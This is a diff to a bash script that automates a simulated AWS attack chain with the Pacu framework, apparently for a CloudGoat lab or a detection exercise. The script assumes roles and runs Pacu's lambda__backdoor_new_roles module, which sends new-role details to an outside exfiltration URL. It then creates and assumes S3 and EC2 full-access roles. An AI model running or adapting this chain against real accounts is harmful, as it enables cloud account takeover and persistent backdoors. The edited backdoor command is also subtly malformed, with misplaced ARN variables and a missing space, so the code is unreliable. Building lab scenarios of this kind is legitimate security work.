@@ -3,13 +3,23 @@ export AWS_REGION='us-east-1'
 
 
 # The following variables should be set in the lambda_hijacking.config
+
+# These fields will come from cloudgoat scenario
 # USERNAME 
 # AWS_ACCESS_KEY 
 # AWS_SECRET_KEY 
-# AWS_ACCOUNT 
+# LAMBDA_SERVICE_ROLE=''
+# LAMBDA_MANAGER_ROLE=''
+# AWS_ACCOUNT
+
+# These fields are unique to each user 
 # ADMIN_AWS_ACCESS_KEY 
 # ADMIN_AWS_SECRET_KEY 
 # ADMIN_SESSION_TOKEN
+
+# These fields used be unique. Example  S3Admin-AG
+# S3Admin=''
+# EC2Admin=''
 
 . ./lambda_hijacking.config
 
@@ -52,11 +62,11 @@ echo $(date -u)
 sleep $timer
 ../pacu/cli.py --session backdoor_roles --whoami
 
-echo 'aws : assume-role lambdaManager-role'
+echo 'aws : assume-role '$LAMBDA_MANAGER_ROLE
 timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
-sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/lambdaManager-role --role-session-name lambdaManager)
+sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/$LAMBDA_MANAGER_ROLE --role-session-name lambdaManager)
 export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
 export AWS_SESSION_TOKEN=$(echo $sts_session | jq -r '.Credentials''.SessionToken')
 export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')
@@ -66,18 +76,6 @@ timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
 ../pacu/cli.py --session backdoor_roles --set-keys backdoor,$AWS_ACCESS_KEY_ID,$AWS_SECRET_ACCESS_KEY,$AWS_SESSION_TOKEN
-
-echo 'pacu: --iam__enum_permissions'
-timer=${RANDOM:0:2}
-echo $(date -u)
-sleep $timer
-../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_permissions
-
-echo 'pacu : --module-name iam__enum_users_roles_policies_groups'
-timer=${RANDOM:0:2}
-echo $(date -u)
-sleep $timer
-../pacu/cli.py --session backdoor_roles --exec --module-name iam__enum_users_roles_policies_groups
 
 echo 'pacu: --whoami'
 timer=${RANDOM:0:2}
@@ -95,7 +93,7 @@ echo 'pacu: lambda__backdoor_new_roles'
 timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
-../pacu/cli.py --session backdoor_roles --exec --module-name lambda__backdoor_new_roles --module-args='--exfil-url https://commander-api.vectratme.com/addrole --role-arn arn:aws:iam::'"$AWS_ACCOUNT"':role/admin-lambda-service-role --arn arn:aws:iam::'"$AWS_ACCOUNT"':user/'$USERNAME
+../pacu/cli.py --session backdoor_roles --exec --module-name lambda__backdoor_new_roles --module-args='--exfil-url https://commander-api.vectratme.com/addrole --role-arn arn:aws:iam::'"$AWS_ACCOUNT"':role/'"$AWS_ACCOUNT"'--arn arn:aws:iam::'"$LAMBDA_SERVICE_ROLE"':user/'$USERNAME
 
 echo 'create roles'
 timer=${RANDOM:0:2}
@@ -108,11 +106,11 @@ export AWS_SECRET_ACCESS_KEY=$ADMIN_AWS_SECRET_KEY
 ##############################################################
 sleep 5
 
-aws iam create-role --role-name S3Admin --assume-role-policy-document file://assume_trust_policy.json  
-aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name S3Admin  
+aws iam create-role --role-name $S3Admin --assume-role-policy-document file://assume_trust_policy.json  
+aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --role-name $S3Admin 
 
-aws iam create-role --role-name EC2Admin --assume-role-policy-document file://assume_trust_policy.json  
-aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --role-name EC2Admin  
+aws iam create-role --role-name $EC2Admin --assume-role-policy-document file://assume_trust_policy.json  
+aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --role-name $EC2Admin  
 
 export AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY
 export AWS_SECRET_ACCESS_KEY=$AWS_SECRET_KEY
@@ -122,7 +120,7 @@ echo 'aws : assume-role s3admin'
 timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
-sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/S3Admin --role-session-name s3admin)
+sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/$S3Admin --role-session-name s3admin)
 sleep 5
 export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')
@@ -145,7 +143,7 @@ echo 'aws : assume-role EC2Admin'
 timer=${RANDOM:0:2}
 echo $(date -u)
 sleep $timer
-sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/EC2Admin --role-session-name ec2admin)
+sts_session=$(aws sts assume-role --role-arn arn:aws:iam::$AWS_ACCOUNT:role/$EC2Admin --role-session-name ec2admin)
 sleep 5
 export AWS_ACCESS_KEY_ID=$(echo $sts_session | jq -r '.Credentials''.AccessKeyId')
 export AWS_SECRET_ACCESS_KEY=$(echo $sts_session | jq -r '.Credentials''.SecretAccessKey')
